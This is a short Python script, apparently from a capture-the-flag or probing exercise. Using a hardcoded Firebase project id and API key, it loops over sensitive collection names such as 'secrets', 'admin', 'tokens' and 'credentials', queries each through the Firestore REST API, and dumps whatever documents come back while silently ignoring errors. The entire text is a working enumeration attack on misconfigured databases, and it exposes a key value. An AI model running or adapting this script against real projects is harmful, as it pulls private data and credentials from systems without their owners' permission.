import urllib.request
import json

project_id = "business-pro-d657d"
api_key = "AIzaSyDH1sF1FEasvvisSp-B8m2ETk2N5L4rZq8"

collections = ["flags", "secrets", "admin", "config", "settings", "private", "hidden", "internal", "keys", "tokens", "credentials"]
for col in collections:
    url = f"https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents/{col}?key={api_key}"
    try:
        with urllib.request.urlopen(url) as response:
            res = json.loads(response.read().decode())
            if res and "documents" in res:
                print(f"FOUND documents in {col}")
                print(json.dumps(res, indent=2))
    except:
        pass
